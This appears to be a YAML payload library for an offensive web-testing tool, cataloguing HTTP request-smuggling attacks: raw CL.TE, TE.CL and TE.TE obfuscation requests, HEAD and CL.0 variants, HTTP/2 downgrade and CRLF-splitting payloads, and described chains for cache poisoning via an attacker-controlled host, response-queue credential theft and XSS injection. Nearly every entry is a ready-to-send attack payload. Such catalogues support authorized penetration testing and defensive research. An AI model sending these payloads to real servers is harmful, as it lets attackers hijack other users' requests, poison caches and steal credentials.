id: http_request_smuggling
name: HTTP Request Smuggling
version: 1.0.0
category: smuggling
description: |
  HTTP/1.1 request-smuggling payloads exploiting front-end / back-end
  disagreement on request boundaries. Covers CL.TE, TE.CL, TE.TE obfuscation
  variants, HEAD-method tricks, and HTTP/2 downgrade smuggling.
mitre:
  - T1190
  - T1556
owasp_top10:
  - A05:2021
references:
  - https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
  - https://portswigger.net/web-security/request-smuggling
  - https://github.com/PortSwigger/http-request-smuggler
related_tools:
  - smuggler
  - h2csmuggler
  - nuclei
chains:
  - bug_bounty_full
  - web_active
payloads:
  - id: cl_te_classic
    name: CL.TE classic
    subcategory: cl_te
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      POST / HTTP/1.1
      Host: target.example.net
      Content-Length: 13
      Transfer-Encoding: chunked

      0

      SMUGGLED
    notes: Front uses CL, back uses TE
    source: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
  - id: te_cl_classic
    name: TE.CL classic
    subcategory: te_cl
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      POST / HTTP/1.1
      Host: target.example.net
      Content-Length: 4
      Transfer-Encoding: chunked

      5c
      GPOST / HTTP/1.1
      Content-Length: 15

      x=1
      0

    notes: Front uses TE, back uses CL
    source: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
  - id: te_te_space
    name: TE.TE space obfuscation
    subcategory: te_te
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      Transfer-Encoding : chunked
    notes: One server treats as TE, the other does not
    source: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
  - id: te_te_dup
    name: Duplicate TE header
    subcategory: te_te
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      Transfer-Encoding: chunked
      Transfer-Encoding: x
    notes: null
    source: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
  - id: te_te_invalid_value
    name: TE invalid value
    subcategory: te_te
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      Transfer-Encoding: xchunked
    notes: null
    source: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
  - id: te_te_underscore
    name: Header name obfuscation underscore
    subcategory: te_te
    encoding: raw
    tech_targets: [generic]
    severity_when_works: high
    payload: |
      Transfer_Encoding: chunked
    notes: null
    source: common knowledge
  - id: te_te_tab
    name: TE tab prefix
    subcategory: te_te
    encoding: raw
    tech_targets: [generic]
    severity_when_works: high
    payload: |
      Transfer-Encoding:	chunked
    notes: Tab in lieu of space
    source: common knowledge
  - id: te_te_vchar
    name: TE 0x0b vertical tab
    subcategory: te_te
    encoding: raw
    tech_targets: [generic]
    severity_when_works: high
    payload: |
      Transfer-Encoding:\x0bchunked
    notes: null
    source: common knowledge
  - id: head_method
    name: HEAD method smuggling
    subcategory: method_confusion
    encoding: raw
    tech_targets: [generic]
    severity_when_works: high
    payload: |
      HEAD / HTTP/1.1
      Host: target.example.net
      Content-Length: 41

      GET /admin HTTP/1.1
      Host: target.example.net

    notes: Some servers respond to HEAD with body
    source: https://portswigger.net/web-security/request-smuggling
  - id: cl_0_smuggle
    name: CL.0 smuggling
    subcategory: cl_0
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      POST /endpoint HTTP/1.1
      Host: target.example.net
      Content-Length: 41

      GET /admin HTTP/1.1
      Host: target.example.net

    notes: Back-end ignores CL on certain endpoints
    source: https://portswigger.net/research/browser-powered-desync-attacks
  - id: h2_te_downgrade
    name: HTTP/2 TE downgrade
    subcategory: h2_smuggle
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      :method: POST
      :path: /
      transfer-encoding: chunked

      0

      SMUGGLED
    notes: Front speaks h2, back speaks h1
    source: https://portswigger.net/research/http-2-the-sequel-is-always-worse
  - id: h2_cl_downgrade
    name: HTTP/2 CL downgrade
    subcategory: h2_smuggle
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      :method: POST
      :path: /
      content-length: 0

      <body bytes>
    notes: null
    source: https://portswigger.net/research/http-2-the-sequel-is-always-worse
  - id: h2_request_splitting
    name: HTTP/2 header CRLF injection -> smuggle
    subcategory: h2_smuggle
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      foo: bar\r\nx-smuggled: yes
    notes: H2 header value with CRLF that downgrades to h1 split
    source: https://portswigger.net/research/http-2-the-sequel-is-always-worse
  - id: tunnel_via_smuggle
    name: Smuggled connection tunnel
    subcategory: technique
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      Smuggle a long-poll request to keep a connection open, then queue victim requests behind it.
    notes: For credential theft via response queue poisoning
    source: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
  - id: smuggle_cache_poison
    name: Smuggle cache poison
    subcategory: cache_poison
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      Smuggle GET /static.js HTTP/1.1\r\nHost: attacker.example.net\r\n with payload body; subsequent victim request gets attacker response.
    notes: null
    source: https://portswigger.net/research/practical-web-cache-poisoning
  - id: smuggle_password_steal
    name: Smuggle reflected creds
    subcategory: credential_theft
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      Smuggle prefix that consumes victim's POST body containing credentials and reflects them via attacker-controlled endpoint.
    notes: null
    source: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
  - id: smuggle_xss_chain
    name: Smuggle into reflected XSS
    subcategory: technique
    encoding: raw
    tech_targets: [generic]
    severity_when_works: critical
    payload: |
      Use smuggling to inject Referer or User-Agent into next victim's response (when reflected).
    notes: null
    source: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
  - id: smuggler_tool
    name: smuggler.py probe
    subcategory: tool_invoke
    encoding: raw
    tech_targets: [generic]
    severity_when_works: high
    payload: |
      python3 smuggler.py -u https://target.example.net -m POST
    notes: PortSwigger smuggler tool
    source: https://github.com/defparam/smuggler
  - id: connection_keep_alive
    name: "Force Connection: keep-alive"
    subcategory: technique
    encoding: raw
    tech_targets: [generic]
    severity_when_works: medium
    payload: |
      Connection: keep-alive
    notes: Required for many smuggle chains
    source: common knowledge
  - id: cl_te_oob_collab
    name: CL.TE OOB collaborator
    subcategory: cl_te
    encoding: raw
    tech_targets: [generic]
    severity_when_works: high
    payload: |
      POST / HTTP/1.1
      Host: target.example.net
      Content-Length: 6
      Transfer-Encoding: chunked

      0

      G
    notes: Wait for delayed/aborted response signature
    source: https://portswigger.net/web-security/request-smuggling/finding
